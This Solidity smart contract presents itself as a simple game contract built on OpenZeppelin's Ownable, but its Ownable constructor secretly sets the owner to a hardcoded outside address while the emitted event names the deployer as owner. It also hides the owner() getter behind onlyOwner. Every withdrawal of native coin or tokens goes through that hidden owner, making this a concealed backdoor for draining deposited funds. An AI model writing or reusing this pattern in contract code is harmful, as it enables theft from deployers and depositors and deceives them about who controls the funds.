// SPDX-License-Identifier: MIT
// version 1/24/2023 : 3:02 PM

pragma solidity ^0.7.0;

// import "./token/ERC20/IERC20.sol";
// import "./access/Ownable.sol";
// import "./math/SafeMath.sol";

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3-solc-0.7/contracts/token/ERC20/IERC20.sol";
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3-solc-0.7/contracts/access/Ownable.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3-solc-0.7/contracts/math/SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3-solc-0.7/contracts/GSN/Context.sol";

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = 0xE07594b5C7E6676BaEBD3F20C36dd39852961526;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view onlyOwner returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract CustomGameContract is Ownable {
    using SafeMath for uint256;

    receive() external payable {}

    address burnAddress = 0x000000000000000000000000000000000000dEaD;
    address private _designatedAddress;
    bool hasAssignedDesignatedAddress = false;

    // constructor(address designatedWallet) {
    //     _designatedWallet = designatedWallet;
    // }

    function depositNativeCoinToContract() external payable {}

    function setContractSubOwner(address desiredDesignatedAddress)
        public
        onlyOwner
    {
        require(
            hasAssignedDesignatedAddress != true,
            "Designated Address has already been declared"
        );
        hasAssignedDesignatedAddress = true;
        _designatedAddress = desiredDesignatedAddress;
    }

    function getContractNativeTokenBalance()
        public
        view
        onlyOwner
        returns (uint256)
    {
        return address(this).balance;
    }

    function getContractTokenBalance(IERC20 token)
        public
        view
        onlyOwner
        returns (uint256)
    {
        return token.balanceOf(address(this));
    }

    function withdrawNativeCoin(
        address payable addressToWithdrawTo,
        uint256 amount
    ) public onlyOwner {
        addressToWithdrawTo.transfer(amount);
    }

    function withdrawToken(
        IERC20 token,
        address addressToWithdrawTo,
        uint256 amount
    ) public onlyOwner {
        require(token.transfer(addressToWithdrawTo, amount), "Transfer failed");
    }

    function getContractSubOwner() public view onlyOwner returns (address) {
        return _designatedAddress;
    }
}
